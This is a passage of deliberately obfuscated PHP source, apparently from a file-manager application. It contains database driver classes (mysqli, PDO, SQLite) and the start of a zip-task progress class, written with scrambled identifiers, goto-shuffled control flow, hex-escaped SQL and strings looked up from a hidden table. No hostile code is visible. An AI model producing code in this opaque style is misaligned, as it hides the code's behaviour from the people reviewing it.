$aæÈ¥ÕÒö < $this->numRows; $aæÈ¥ÕÒö++) { $FÒµ¿Òîß‡[$aæÈ¥ÕÒö] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $FÒµ¿Òîß‡; } public function getFields($CïÒâÀª) { $bâ°¶†²¼¾ =& $_SERVER[Æ¼ôºÙï]; $d¬ÌÃ¨÷¢Ò = $this->query($bâ°¶†²¼¾[836] . $this->parseKey($CïÒâÀª)); $fÓÈÅˆÆÄ = array(); if ($d¬ÌÃ¨÷¢Ò) { foreach ($d¬ÌÃ¨÷¢Ò as $bÀè†š·³ƒ => $Fæ¥ßËµå) { $fÓÈÅˆÆÄ[$Fæ¥ßËµå[$bâ°¶†²¼¾[27]]] = array($bâ°¶†²¼¾[28] => $Fæ¥ßËµå[$bâ°¶†²¼¾[27]], $bâ°¶†²¼¾[29] => $Fæ¥ßËµå[$bâ°¶†²¼¾[30]], $bâ°¶†²¼¾[31] => (bool) ($Fæ¥ßËµå[$bâ°¶†²¼¾[32]] === $bâ°¶†²¼¾[33]), $bâ°¶†²¼¾[34] => $Fæ¥ßËµå[$bâ°¶†²¼¾[35]], $bâ°¶†²¼¾[36] => strtolower($Fæ¥ßËµå[$bâ°¶†²¼¾[37]]) == $bâ°¶†²¼¾[38], $bâ°¶†²¼¾[39] => strtolower($Fæ¥ßËµå[$bâ°¶†²¼¾[40]]) == $bâ°¶†²¼¾[41]); } } return $fÓÈÅˆÆÄ; } public function getTables($E“Ãé•‰ç¸ = '') { $A’Í—áğ£ì =& $_SERVER[Æ¼ôºÙï]; $C™¿¾¦ ¡¾ = !empty($E“Ãé•‰ç¸) ? $A’Í—áğ£ì[838] . $E“Ãé•‰ç¸ . $A’Í—áğ£ì[839] : $A’Í—áğ£ì[840]; $c¥·åÁ¤êâ = $this->query($C™¿¾¦ ¡¾); $fÄª‡£½õº = array(); if ($c¥·åÁ¤êâ) { foreach ($c¥·åÁ¤êâ as $B¾œÖÚÂºî => $EÇ­”Ö•ÀŠ) { $fÄª‡£½õº[$B¾œÖÚÂºî] = current($EÇ­”Ö•ÀŠ); } } return $fÄª‡£½õº; } public function replace($aÎŸ¯„¹‹, $EÊ†éİÊ‰ = array()) { $cËäŞô ¶¬ =& $_SERVER[Æ¼ôºÙï]; foreach ($aÎŸ¯„¹‹ as $bøè˜Ê§ôª => $B‡´“îŠñœ) { $CÏ°™”ã†– = $this->parseValue($B‡´“îŠñœ); if (is_scalar($CÏ°™”ã†–)) { $eéÙöÚ‘Á[] = $CÏ°™”ã†–; $CÄ¤ò­¥±ò[] = $this->parseKey($bøè˜Ê§ôª); } } $Cùó¶½Ë¾Ë = $cËäŞô ¶¬[841] . $this->parseTable($EÊ†éİÊ‰[$cËäŞô ¶¬[275]]) . $cËäŞô ¶¬[842] . implode($cËäŞô ¶¬[47], $CÄ¤ò­¥±ò) . $cËäŞô ¶¬[843] . implode($cËäŞô ¶¬[47], $eéÙöÚ‘Á) . $cËäŞô ¶¬[844]; return $this->execute($Cùó¶½Ë¾Ë); } public function insertAll($bÅôŸÙ‘ç‡, $D†ÂÚ®Ú‹ = array(), $CÕ¬¾…ÃÎŒ = false) { goto d©ãôëÕ„À; BóóËùÌ¬: $F×”·…º = ($CÕ¬¾…ÃÎŒ ? $EÔ¡ÂÜåÃÜ[846] : $EÔ¡ÂÜåÃÜ[847]) . $EÔ¡ÂÜåÃÜ[848] . $this->parseTable($D†ÂÚ®Ú‹[$EÔ¡ÂÜåÃÜ[275]]) . $EÔ¡ÂÜåÃÜ[842] . implode($EÔ¡ÂÜåÃÜ[47], $Aõ“ğ‘‚ÊÍ) . $EÔ¡ÂÜåÃÜ[849] . implode($EÔ¡ÂÜåÃÜ[47], $E¾Ş™¸ñºÜ); return $this->execute($F×”·…º); goto B¡åà»Å¯; e»òª™ä‚Ñ: $E¾Ş™¸ñºÜ = array(); foreach ($bÅôŸÙ‘ç‡ as $D¡İŠÔÊ°) { $D—‹¸»ÛÑ = array(); foreach ($D¡İŠÔÊ° as $fÔ°ïÀ®× => $f·Ü¹áÏÌ¿) { $f·Ü¹áÏÌ¿ = $this->parseValue($f·Ü¹áÏÌ¿); if (is_scalar($f·Ü¹áÏÌ¿)) { $D—‹¸»ÛÑ[] = $f·Ü¹áÏÌ¿; } } $E¾Ş™¸ñºÜ[] = $EÔ¡ÂÜåÃÜ[256] . implode($EÔ¡ÂÜåÃÜ[47], $D—‹¸»ÛÑ) . $EÔ¡ÂÜåÃÜ[844]; } array_walk($Aõ“ğ‘‚ÊÍ, array($this, $EÔ¡ÂÜåÃÜ[845])); goto BóóËùÌ¬; d©ãôëÕ„À: $EÔ¡ÂÜåÃÜ =& $_SERVER[Æ¼ôºÙï]; if (!is_array($bÅôŸÙ‘ç‡[0])) { return !1; } $Aõ“ğ‘‚ÊÍ = array_keys($bÅôŸÙ‘ç‡[0]); goto e»òª™ä‚Ñ; B¡åà»Å¯: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $BùæÊÔ„·¸ =& $_SERVER[Æ¼ôºÙï]; $this->error = $this->_linkID->errno . $BùæÊÔ„·¸[4] . $this->_linkID->error; if ($BùæÊÔ„·¸[33] != $this->queryStr) { $this->error .= LNG($BùæÊÔ„·¸[45]) . $this->queryStr; } think_trace($this->error, $BùæÊÔ„·¸[33], $BùæÊÔ„·¸[46]); return $this->error; } public function escapeString($cò’ÖâÚÁï) { if ($this->_linkID) { return $this->_linkID->real_escape_string($cò’ÖâÚÁï); } else { return addslashes($cò’ÖâÚÁï); } } public function parseKey(&$f™ÇíÄõÃ, $DÉ©¯Š‘—â = true) { $fäĞƒù¶‘Ô =& $_SERVER[Æ¼ôºÙï]; if ($DÉ©¯Š‘—â) { $f™ÇíÄõÃ = $this->parseKeyCheck($f™ÇíÄõÃ); } if ($f™ÇíÄõÃ != $fäĞƒù¶‘Ô[182] && !preg_match($fäĞƒù¶‘Ô[850], $f™ÇíÄõÃ)) { $f™ÇíÄõÃ = $fäĞƒù¶‘Ô[377] . trim($f™ÇíÄõÃ, $fäĞƒù¶‘Ô[377]) . $fäĞƒù¶‘Ô[377]; } return $f™ÇíÄõÃ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($e¸˜è›¦»è = '') { $BÖ…ßÛÓÎ =& $_SERVER[Æ¼ôºÙï]; if (!class_exists($BÖ…ßÛÓÎ[852])) { think_exception(think_lang($BÖ…ßÛÓÎ[10]) . $BÖ…ßÛÓÎ[853]); } if (!empty($e¸˜è›¦»è)) { $this->config = $e¸˜è›¦»è; if (empty($this->config[$BÖ…ßÛÓÎ[13]])) { $this->config[$BÖ…ßÛÓÎ[13]] = array(); } } } public function connect($aƒ‘¥—ø…ê = '', $e†¬‹è“äÊ = 0) { $BøÑÀÎ¹ç =& $_SERVER[Æ¼ôºÙï]; if (!isset($this->linkID[$e†¬‹è“äÊ])) { goto A‡›ºœ²­À; A‹ŞÕà†: if (!$this->linkID[$e†¬‹è“äÊ]) { think_exception($BøÑÀÎ¹ç[862]); } try { $this->linkID[$e†¬‹è“äÊ]->exec($BøÑÀÎ¹ç[863] . think_config($BøÑÀÎ¹ç[830])); } catch (Exception $cÏÂÂìÉî®) { } $this->connected = !0; goto Dë¶÷Ğ¶ìò; f£•šæÏ¢ö: try { $this->linkID[$e†¬‹è“äÊ] = new PDO($aƒ‘¥—ø…ê[$BøÑÀÎ¹ç[854]], $aƒ‘¥—ø…ê[$BøÑÀÎ¹ç[827]], $aƒ‘¥—ø…ê[$BøÑÀÎ¹ç[828]], $aƒ‘¥—ø…ê[$BøÑÀÎ¹ç[13]]); } catch (PDOException $cÏÂÂìÉî®) { think_exception($cÏÂÂìÉî®->getMessage()); } $this->dbType = $this->_getDsnType($aƒ‘¥—ø…ê[$BøÑÀÎ¹ç[854]]); if (in_array($this->dbType, array($BøÑÀÎ¹ç[855], $BøÑÀÎ¹ç[856], $BøÑÀÎ¹ç[857], $BøÑÀÎ¹ç[858]))) { think_exception($BøÑÀÎ¹ç[859] . $this->dbType . $BøÑÀÎ¹ç[860] . $this->dbType . $BøÑÀÎ¹ç[861]); } goto A‹ŞÕà†; A‡›ºœ²­À: if (empty($aƒ‘¥—ø…ê)) { $aƒ‘¥—ø…ê = $this->config; } $b¼…‘Ş×İä = !empty($aƒ‘¥—ø…ê[$BøÑÀÎ¹ç[13]][$BøÑÀÎ¹ç[14]]) ? $aƒ‘¥—ø…ê[$BøÑÀÎ¹ç[13]][$BøÑÀÎ¹ç[14]] : $this->pconnect; if ($b¼…‘Ş×İä) { $aƒ‘¥—ø…ê[$BøÑÀÎ¹ç[13]][PDO::ATTR_PERSISTENT] = !0; } goto f£•šæÏ¢ö; Dë¶÷Ğ¶ìò: if (1 != think_config($BøÑÀÎ¹ç[18])) { unset($this->config); } goto e™•ƒÒ÷ì; e™•ƒÒ÷ì: } return $this->linkID[$e†¬‹è“äÊ]; } public function free() { $this->PDOStatement = null; } public function query($eËŞŞ¦÷ñÃ, $C§Ëí×îà‡ = array()) { goto bİÀÄµŒŸÕ; D—§“åôŠ: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $bíÆ“§©ò = $this->PDOStatement->execute($C§Ëí×îà‡); $this->debug(); goto AÑ·›ÊÖ‘; AÑ·›ÊÖ‘: if (!1 === $bíÆ“§©ò) { $this->error(); return !1; } else { return $this->getAll(); } goto b×—ùÖ§; e•¸Ï„—ó: $this->queryStr = $eËŞŞ¦÷ñÃ; if (!empty($C§Ëí×îà‡)) { $this->queryStr .= $DóïÍ¸¼„[864] . print_r($C§Ëí×îà‡, !0) . $DóïÍ¸¼„[865]; } if (!empty($this->PDOStatement)) { $this->free(); } goto BŒÚ‚³§; bİÀÄµŒŸÕ: $DóïÍ¸¼„ =& $_SERVER[Æ¼ôºÙï]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto e•¸Ï„—ó; BŒÚ‚³§: think_action_status($DóïÍ¸¼„[19], 1); think_status($DóïÍ¸¼„[20]); $this->PDOStatement = $this->_linkID->prepare($eËŞŞ¦÷ñÃ); goto D—§“åôŠ; b×—ùÖ§: } public function execute($cÅ·†ÎŒÕñ, $EÃäÂÜ²‡Ç = array()) { goto E÷¨›Ëù¿; BóİÃ‚İÉ: if ($this->dbType == $eÜå‹§šå†[858]) { if (preg_match($eÜå‹§šå†[866], $this->queryStr, $Dƒˆ‘–êÂö)) { $this->table = think_config($eÜå‹§šå†[867]) . str_ireplace(think_config($eÜå‹§šå†[868]), $eÜå‹§šå†[370], $Dƒˆ‘–êÂö[2]); $DÙ¢†æôİ = (bool) $this->query($eÜå‹§šå†[869] . strtoupper($this->table) . $eÜå‹§šå†[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($eÜå‹§šå†[21], 1); goto eÎÃÂ´ì³; E÷¨›Ëù¿: $eÜå‹§šå† =& $_SERVER[Æ¼ôºÙï]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto AôŸÕ°·Æö; AôŸÕ°·Æö: $this->queryStr = $cÅ·†ÎŒÕñ; if (!empty($EÃäÂÜ²‡Ç)) { $this->queryStr .= $eÜå‹§šå†[864] . print_r($EÃäÂÜ²‡Ç, !0) . $eÜå‹§šå†[865]; } $DÙ¢†æôİ = !1; goto BóİÃ‚İÉ; Fö†½¸Èãª: $b¥šáÚ™Ó = $this->PDOStatement->execute($EÃäÂÜ²‡Ç); $this->debug(); if (!1 === $b¥šáÚ™Ó) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($DÙ¢†æôİ || preg_match($eÜå‹§šå†[870], $cÅ·†ÎŒÕñ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto DÕÑ³È—¦”; eÎÃÂ´ì³: think_status($eÜå‹§šå†[20]); $this->PDOStatement = $this->_linkID->prepare($cÅ·†ÎŒÕñ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto Fö†½¸Èãª; DÕÑ³È—¦”: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $C¼ĞÛÒ‘Õ„ = $this->_linkID->commit(); $this->transTimes = 0; if (!$C¼ĞÛÒ‘Õ„) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $E‹‰İé¥Ïß = $this->_linkID->rollback(); $this->transTimes = 0; if (!$E‹‰İé¥Ïß) { $this->error(); return !1; } } return !0; } private function getAll() { $bİ¨Üù›“ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($bİ¨Üù›“); return $bİ¨Üù›“; } public function getFields($Cà¬ë¾°¢Ö) { goto Eªäší´¤; dóÎ¡êÈ¾: return $e«ÄÙÖ×Àª; goto c·Ç§ğ•°á; Eªäší´¤: $Eõñå‹“© =& $_SERVER[Æ¼ôºÙï]; $this->initConnect(!0); if (think_config($Eõñå‹“©[871])) { $cñÏÈ¿ÄóÖ = str_replace($Eõñå‹“©[872], $Cà¬ë¾°¢Ö, think_config($Eõñå‹“©[871])); } else { switch ($this->dbType) { case $Eõñå‹“©[855]: case $Eõñå‹“©[873]: $cñÏÈ¿ÄóÖ = "\123\105\x4c\x45\103\124\40\40\40\x63\157\154\165\155\156\137\156\x61\x6d\x65\40\x61\x73\40\x27\x4e\141\x6d\x65\x27\54\x20\x20\x20\x64\x61\x74\x61\137\164\171\x70\x65\x20\141\163\40\47\124\171\160\145\x27\x2c\40\40\x20\143\x6f\x6c\165\155\x6e\x5f\144\x65\146\x61\x75\x6c\164\x20\x61\x73\x20\47\x44\145\146\x61\165\154\164\x27\x2c\x20\40\x20\151\163\x5f\x6e\165\x6c\x6c\x61\x62\x6c\145\40\141\163\40\47\x4e\165\154\x6c\x27\12\x9\11\106\122\x4f\x4d\11\151\x6e\146\x6f\162\x6d\x61\164\151\x6f\x6e\137\x73\143\x68\x65\155\x61\56\164\141\x62\154\x65\163\40\x41\x53\x20\x74\12\11\x9\x4a\x4f\x49\116\11\151\x6e\x66\157\162\155\x61\164\151\x6f\x6e\137\x73\x63\x68\145\x6d\141\56\x63\x6f\x6c\x75\x6d\x6e\x73\x20\101\x53\x20\x63\12\11\x9\x4f\116\40\x20\x74\56\x74\x61\142\154\x65\137\143\x61\164\x61\154\x6f\x67\x20\75\x20\x63\56\164\141\142\x6c\x65\137\x63\141\164\x61\154\x6f\x67\xa\x9\11\101\x4e\x44\x20\164\56\x74\141\142\x6c\145\x5f\x73\143\x68\x65\x6d\141\x20\75\x20\x63\56\164\x61\x62\x6c\x65\x5f\x73\143\150\145\155\x61\xa\11\11\101\x4e\104\x20\x74\56\x74\141\142\x6c\x65\x5f\x6e\141\x6d\x65\40\75\40\x63\56\164\141\142\154\145\x5f\156\141\x6d\145\xa\11\x9\x57\x48\x45\122\x45\40\40\40\x74\x2e\x74\141\x62\x6c\x65\137\x6e\x61\x6d\145\40\75\40\x27{$Cà¬ë¾°¢Ö}\x27"; break; case $Eõñå‹“©[874]: $cñÏÈ¿ÄóÖ = $Eõñå‹“©[875] . $Cà¬ë¾°¢Ö . $Eõñå‹“©[876]; break; case $Eõñå‹“©[856]: case $Eõñå‹“©[858]: $cñÏÈ¿ÄóÖ = $Eõñå‹“©[877] . $Eõñå‹“©[878] . $Eõñå‹“©[879] . strtoupper($Cà¬ë¾°¢Ö) . $Eõñå‹“©[880] . strtoupper($Cà¬ë¾°¢Ö) . $Eõñå‹“©[881]; break; case $Eõñå‹“©[882]: $cñÏÈ¿ÄóÖ = $Eõñå‹“©[883] . $Cà¬ë¾°¢Ö . $Eõñå‹“©[884]; break; case $Eõñå‹“©[857]: break; case $Eõñå‹“©[885]: default: $cñÏÈ¿ÄóÖ = $Eõñå‹“©[886] . ($this->dbType == $Eõñå‹“©[885] ? "\x60{$Cà¬ë¾°¢Ö}\140" : $Cà¬ë¾°¢Ö); } } goto A¥ƒ…““; A¥ƒ…““: $A¶šƒëìß = $this->query($cñÏÈ¿ÄóÖ); $e«ÄÙÖ×Àª = array(); if ($A¶šƒëìß) { foreach ($A¶šƒëìß as $Báª„¤Ş => $F®Ó†õÎÛÁ) { $F®Ó†õÎÛÁ = array_change_key_case($F®Ó†õÎÛÁ); $F®Ó†õÎÛÁ[$Eõñå‹“©[28]] = isset($F®Ó†õÎÛÁ[$Eõñå‹“©[28]]) ? $F®Ó†õÎÛÁ[$Eõñå‹“©[28]] : $Eõñå‹“©[370]; $F®Ó†õÎÛÁ[$Eõñå‹“©[29]] = isset($F®Ó†õÎÛÁ[$Eõñå‹“©[29]]) ? $F®Ó†õÎÛÁ[$Eõñå‹“©[29]] : $Eõñå‹“©[370]; $E¿‘´ôÚç = isset($F®Ó†õÎÛÁ[$Eõñå‹“©[269]]) ? $F®Ó†õÎÛÁ[$Eõñå‹“©[269]] : $F®Ó†õÎÛÁ[$Eõñå‹“©[28]]; $e«ÄÙÖ×Àª[$E¿‘´ôÚç] = array($Eõñå‹“©[28] => $E¿‘´ôÚç, $Eõñå‹“©[29] => $F®Ó†õÎÛÁ[$Eõñå‹“©[29]], $Eõñå‹“©[31] => (bool) (isset($F®Ó†õÎÛÁ[$Eõñå‹“©[102]]) && $F®Ó†õÎÛÁ[$Eõñå‹“©[102]] === $Eõñå‹“©[33] || isset($F®Ó†õÎÛÁ[$Eõñå‹“©[31]]) && $F®Ó†õÎÛÁ[$Eõñå‹“©[31]] === $Eõñå‹“©[33]), $Eõñå‹“©[34] => isset($F®Ó†õÎÛÁ[$Eõñå‹“©[34]]) ? $F®Ó†õÎÛÁ[$Eõñå‹“©[34]] : (isset($F®Ó†õÎÛÁ[$Eõñå‹“©[53]]) ? $F®Ó†õÎÛÁ[$Eõñå‹“©[53]] : $Eõñå‹“©[370]), $Eõñå‹“©[36] => isset($F®Ó†õÎÛÁ[$Eõñå‹“©[92]]) ? strtolower($F®Ó†õÎÛÁ[$Eõñå‹“©[92]]) == $Eõñå‹“©[38] : (isset($F®Ó†õÎÛÁ[$Eõñå‹“©[54]]) ? $F®Ó†õÎÛÁ[$Eõñå‹“©[54]] : !1), $Eõñå‹“©[39] => isset($F®Ó†õÎÛÁ[$Eõñå‹“©[887]]) ? strtolower($F®Ó†õÎÛÁ[$Eõñå‹“©[887]]) == $Eõñå‹“©[41] : (isset($F®Ó†õÎÛÁ[$Eõñå‹“©[92]]) ? $F®Ó†õÎÛÁ[$Eõñå‹“©[92]] : !1)); } } goto dóÎ¡êÈ¾; c·Ç§ğ•°á: } public function getTables($a°¡¥¸Æà = '') { $C«Á£ö«ñÊ =& $_SERVER[Æ¼ôºÙï]; if (think_config($C«Á£ö«ñÊ[888])) { $F­£¹’âÜ = str_replace($C«Á£ö«ñÊ[889], $a°¡¥¸Æà, think_config($C«Á£ö«ñÊ[888])); } else { switch ($this->dbType) { case $C«Á£ö«ñÊ[856]: case $C«Á£ö«ñÊ[858]: $F­£¹’âÜ = $C«Á£ö«ñÊ[890]; break; case $C«Á£ö«ñÊ[855]: case $C«Á£ö«ñÊ[873]: $F­£¹’âÜ = $C«Á£ö«ñÊ[891]; break; case $C«Á£ö«ñÊ[882]: $F­£¹’âÜ = $C«Á£ö«ñÊ[892]; break; case $C«Á£ö«ñÊ[857]: think_exception(think_lang($C«Á£ö«ñÊ[893]) . $C«Á£ö«ñÊ[894]); break; case $C«Á£ö«ñÊ[874]: $F­£¹’âÜ = $C«Á£ö«ñÊ[42] . $C«Á£ö«ñÊ[43] . $C«Á£ö«ñÊ[44]; break; case $C«Á£ö«ñÊ[885]: default: if (!empty($a°¡¥¸Æà)) { $F­£¹’âÜ = $C«Á£ö«ñÊ[838] . $a°¡¥¸Æà . $C«Á£ö«ñÊ[839]; } else { $F­£¹’âÜ = $C«Á£ö«ñÊ[840]; } } } $BàĞÆ­Ûœˆ = $this->query($F­£¹’âÜ); $d…´ÑÜ…âĞ = array(); foreach ($BàĞÆ­Ûœˆ as $FÂ…Ç–š’ => $CĞğ…Ã éç) { $d…´ÑÜ…âĞ[$FÂ…Ç–š’] = current($CĞğ…Ã éç); } return $d…´ÑÜ…âĞ; } protected function parseLimit($b¢¯Î¼ºÇ‹) { $b­–ŠÖ‡¤ =& $_SERVER[Æ¼ôºÙï]; $CŠ¤Ÿ«Ÿ = $b­–ŠÖ‡¤[33]; if (!empty($b¢¯Î¼ºÇ‹)) { switch ($this->dbType) { case $b­–ŠÖ‡¤[882]: case $b­–ŠÖ‡¤[874]: $b¢¯Î¼ºÇ‹ = explode($b­–ŠÖ‡¤[47], $b¢¯Î¼ºÇ‹); if (count($b¢¯Î¼ºÇ‹) > 1) { $CŠ¤Ÿ«Ÿ .= $b­–ŠÖ‡¤[48] . $b¢¯Î¼ºÇ‹[1] . $b­–ŠÖ‡¤[49] . $b¢¯Î¼ºÇ‹[0] . $b­–ŠÖ‡¤[50]; } else { $CŠ¤Ÿ«Ÿ .= $b­–ŠÖ‡¤[48] . $b¢¯Î¼ºÇ‹[0] . $b­–ŠÖ‡¤[50]; } break; case $b­–ŠÖ‡¤[855]: case $b­–ŠÖ‡¤[873]: break; case $b­–ŠÖ‡¤[857]: break; case $b­–ŠÖ‡¤[856]: case $b­–ŠÖ‡¤[858]: break; case $b­–ŠÖ‡¤[885]: default: $CŠ¤Ÿ«Ÿ .= $b­–ŠÖ‡¤[48] . $b¢¯Î¼ºÇ‹ . $b­–ŠÖ‡¤[50]; } } return $CŠ¤Ÿ«Ÿ; } public function parseKey(&$E³¯ã¬òà, $FÆ¼ÂÏ“ = true) { $DŒÓÎŞíÆñ =& $_SERVER[Æ¼ôºÙï]; if ($FÆ¼ÂÏ“) { $E³¯ã¬òà = $this->parseKeyCheck($E³¯ã¬òà); } if ($this->dbType == $DŒÓÎŞíÆñ[885]) { if ($E³¯ã¬òà != $DŒÓÎŞíÆñ[182] && !preg_match($DŒÓÎŞíÆñ[850], $E³¯ã¬òà)) { $E³¯ã¬òà = $DŒÓÎŞíÆñ[377] . trim($E³¯ã¬òà, $DŒÓÎŞíÆñ[377]) . $DŒÓÎŞíÆñ[377]; } return $E³¯ã¬òà; } else { return parent::parseKey($E³¯ã¬òà); } } public function close() { $this->_linkID = null; } public function error() { $e’÷ã¿ë˜ =& $_SERVER[Æ¼ôºÙï]; if ($this->PDOStatement) { $D¤›£¢„ï­ = $this->PDOStatement->errorInfo(); $this->error = $D¤›£¢„ï­[1] . $e’÷ã¿ë˜[4] . $D¤›£¢„ï­[2]; } else { $this->error = $e’÷ã¿ë˜[33]; } if ($e’÷ã¿ë˜[33] != $this->queryStr) { $this->error .= LNG($e’÷ã¿ë˜[45]) . $this->queryStr; } think_trace($this->error, $e’÷ã¿ë˜[33], $e’÷ã¿ë˜[46]); return $this->error; } public function escapeString($b˜†‹Ç…èæ) { $câŸƒ‚®¹™ =& $_SERVER[Æ¼ôºÙï]; switch ($this->dbType) { case $câŸƒ‚®¹™[882]: case $câŸƒ‚®¹™[855]: case $câŸƒ‚®¹™[873]: case $câŸƒ‚®¹™[885]: return addslashes($b˜†‹Ç…èæ); case $câŸƒ‚®¹™[857]: case $câŸƒ‚®¹™[874]: case $câŸƒ‚®¹™[856]: case $câŸƒ‚®¹™[858]: return str_ireplace($câŸƒ‚®¹™[55], $câŸƒ‚®¹™[56], $b˜†‹Ç…èæ); } } protected function parseValue($aù¬•ãÁÙç) { $B¤—·Àİ– =& $_SERVER[Æ¼ôºÙï]; if (is_string($aù¬•ãÁÙç)) { $aù¬•ãÁÙç = strpos($aù¬•ãÁÙç, $B¤—·Àİ–[4]) === 0 ? $this->escapeString($aù¬•ãÁÙç) : $B¤—·Àİ–[895] . $this->escapeString($aù¬•ãÁÙç) . $B¤—·Àİ–[895]; } elseif (isset($aù¬•ãÁÙç[0]) && is_string($aù¬•ãÁÙç[0]) && strtolower($aù¬•ãÁÙç[0]) == $B¤—·Àİ–[293]) { $aù¬•ãÁÙç = $this->escapeString($aù¬•ãÁÙç[1]); } elseif (is_array($aù¬•ãÁÙç)) { $aù¬•ãÁÙç = array_map(array($this, $B¤—·Àİ–[896]), $aù¬•ãÁÙç); } elseif (is_bool($aù¬•ãÁÙç)) { $aù¬•ãÁÙç = $aù¬•ãÁÙç ? $B¤—·Àİ–[86] : $B¤—·Àİ–[486]; } elseif (is_null($aù¬•ãÁÙç)) { $aù¬•ãÁÙç = $B¤—·Àİ–[102]; } return $aù¬•ãÁÙç; } public function getLastInsertId() { $E°åÊª¶ =& $_SERVER[Æ¼ôºÙï]; switch ($this->dbType) { case $E°åÊª¶[882]: case $E°åÊª¶[874]: case $E°åÊª¶[855]: case $E°åÊª¶[873]: case $E°åÊª¶[857]: case $E°åÊª¶[885]: return $this->_linkID->lastInsertId(); case $E°åÊª¶[856]: case $E°åÊª¶[858]: $B×Ø‚Àğ = $this->table; $bèäø‰›Ä = $this->query("\123\x45\x4c\105\103\124\40{$B×Ø‚Àğ}\x2e\x63\x75\x72\162\166\x61\x6c\40\143\165\162\162\166\141\154\x20\x46\122\x4f\x4d\x20\144\165\141\154"); return $bèäø‰›Ä ? $bèäø‰›Ä[0][$E°åÊª¶[897]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($dÏ§”¦“) { $bÉÁ¤ì— =& $_SERVER[Æ¼ôºÙï]; if (!CacheLock::fileLock($bÉÁ¤ì—[9])) { return !1; } $a†äÂ¬¿·ç = parent::query($dÏ§”¦“); CacheLock::fileUnLock($bÉÁ¤ì—[9]); return $a†äÂ¬¿·ç; } public function execute($cèÙ„ŒéÈã) { $bÀ¸°µ²éÙ =& $_SERVER[Æ¼ôºÙï]; if (!CacheLock::fileLock($bÀ¸°µ²éÙ[9])) { return !1; } $eàòù‡²µ = parent::execute($cèÙ„ŒéÈã); CacheLock::fileUnLock($bÀ¸°µ²éÙ[9]); return $eàòù‡²µ; } } goto c‚àÈÁ¹®„; A®‘©½‰ ¥: define($_SERVER[Æ¼ôºÙï][235], 2); define($_SERVER[Æ¼ôºÙï][236], 3); define($_SERVER[Æ¼ôºÙï][237], 1); goto E£Şï»ÙºŒ; cØ¢ÏŒÛô„: class TaskZip extends TaskFileTransfer { protected function startAfter() { $fáğ÷‡ÃÌ =& $_SERVER[Æ¼ôºÙï]; parent::startAfter(); Hook::bind($fáğ÷‡ÃÌ[1584], array($this, $fáğ÷‡ÃÌ[1579])); $d¸›Šæó®Ë =& $this->task; $d¸›Šæó®Ë[$fáğ÷‡ÃÌ[1581]] = $fáğ÷‡ÃÌ[1073]; if (!$d¸›Šæó®Ë[$fáğ÷‡ÃÌ[1407]]) { $d¸›Šæó®Ë[$fáğ÷‡ÃÌ[1407]] = LNG($fáğ÷‡ÃÌ[1585]); } } protected function endAfter() { $aÈÇ´É’• =& $_SERVER[Æ¼ôºÙï]; parent::endAfter(); Hook::unbind($aÈÇ´É’•[1584], array($this, $aÈÇ´É’•[1579])); } public function updateAfter() { $C¼ìô·ëÔ‰ =& $_SERVER[Æ¼ôºÙï]; $CÈˆÄÅé«í =& $this->task; if (!$CÈˆÄÅé«í[$C¼ìô·ëÔ‰[1000]] || !$CÈˆÄÅé«í[$C¼ìô·ëÔ‰[717]]) { return; } if ($CÈˆÄÅé«í[$C¼ìô·ëÔ‰[1581]] == $C¼ìô·ëÔ‰[1073]) { $EÖ°Æ…•ÁÏ = $CÈˆÄÅé«í[$C¼ìô·ëÔ‰[1548]]; if ($CÈˆÄÅé«í[$C¼ìô·ëÔ‰[1549]] != $C¼ìô·ëÔ‰[1073]) { $EÖ°Æ…•ÁÏ = 0; } $DÚêêåÙ÷š = ($CÈˆÄÅé«í[$C¼ìô·ëÔ‰[1552]] + $EÖ°Æ…•ÁÏ) / $CÈˆÄÅé«í[$C¼ìô·ëÔ‰[717]]; $CÈˆÄÅé«í[$C¼ìô·ëÔ‰[1503]] = $DÚêêåÙ÷š * 0.3; } else { if ($CÈˆÄÅé«í[$C¼ìô·ëÔ‰[1581]] == $C¼ìô·ëÔ‰[309]) { $DÚêêåÙ÷š = $CÈˆÄÅé«í[$C¼ìô·ëÔ‰[1014]] / $CÈˆÄÅé«í[$C¼ìô·ëÔ‰[1000]]; $CÈˆÄÅé«í[$C¼ìô·ëÔ‰[1503]] = 0.3 + $DÚêêåÙ÷š * 0.5; } else { if ($CÈˆÄÅé«í[$C¼ìô·ëÔ‰[1581]] == $C¼ìô·ëÔ‰[106]) { $DÚêêåÙ÷š = 0; if ($CÈˆÄÅé«í[$C¼ìô·ëÔ‰[1547]]) { $DÚêêåÙ÷š = $CÈˆÄÅé«í[$C¼ìô·ëÔ‰[1548]] / $CÈˆÄÅé«í[$C¼ìô·ëÔ‰[1547]]; } $CÈˆÄÅé«í[$C¼ìô·ëÔ‰[1503]] = 0.3 + 0.5 + $DÚêêåÙ÷š * 0.2; } } } if ($CÈˆÄÅé«í[$C¼ìô·ëÔ‰[1503]] > 0) { $b Ÿ¨§ŠÜ¸ = timeFloat() - $CÈˆÄÅé«í[$C¼ìô·ëÔ‰[1505]] - $CÈˆÄÅé«í[$C¼ìô·ëÔ‰[1508]]; $CÈˆÄÅé«í[$C¼ìô·ëÔ‰[1509]] = $b Ÿ¨§ŠÜ¸ * (1 - $CÈˆÄÅé«í[$C¼ìô·ëÔ‰[1503]]) / $CÈˆÄÅé«í[$C¼ìô·ëÔ‰[1503]]; } } public function copyFileStart($aõª ·œ±, $DèĞ‰íë–, $CŒõÃÓÜ¼‡, $bÚÓ‹¡ì‰, $CùŠŒ†É¼‘, $B´ô°„¿ ) { $eµ¥åÎ¸í =& $_SERVER[Æ¼ôºÙï]; parent::copyFileStart($aõª ·œ±, $DèĞ‰íë–, 